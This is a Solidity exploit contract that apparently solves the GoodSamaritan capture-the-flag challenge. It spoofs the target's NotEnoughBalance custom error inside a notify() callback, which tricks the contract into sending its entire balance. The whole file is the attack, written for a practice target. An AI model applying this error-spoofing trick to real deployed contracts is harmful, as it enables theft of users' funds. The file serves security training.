// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import {INotifyable} from "./GoodSamaritan.sol";
import {GoodSamaritan} from "./GoodSamaritan.sol";

contract GoodSamaritanAttacker is INotifyable {
    GoodSamaritan target;

    error NotEnoughBalance();
    
    constructor(address _target) {
        target = GoodSamaritan(_target);
    }

    function attack() public {
        target.requestDonation();
    }

    function notify(uint256 amount) external {

        if (amount == 10) {
            revert NotEnoughBalance();
        }

    }
}
